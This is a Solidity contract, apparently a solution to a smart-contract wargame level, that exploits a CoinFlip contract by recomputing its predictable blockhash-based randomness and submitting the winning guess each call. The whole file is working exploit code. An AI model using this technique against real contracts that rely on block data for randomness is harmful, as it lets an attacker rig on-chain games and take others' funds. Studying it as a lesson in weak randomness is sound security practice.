// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipAttack {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public immutable target;
    address public immutable owner;
    uint public success = 0;
    uint public fail = 0;


    error ErrOnlyOwner();
    modifier onlyOwner() {
        if (msg.sender != owner)
            revert ErrOnlyOwner();

        _; // Continue executing the function
    }

    constructor(address trg) {
        owner = msg.sender;
        target = trg;
    }

    function flip() public onlyOwner returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;

        bool res = CoinFlip(target).flip(coinFlip == 1);

        if (res) ++success;
        else ++fail;

        return res;
    }

    function end() onlyOwner public payable {
        payable(msg.sender).transfer(address(this).balance);
    }
}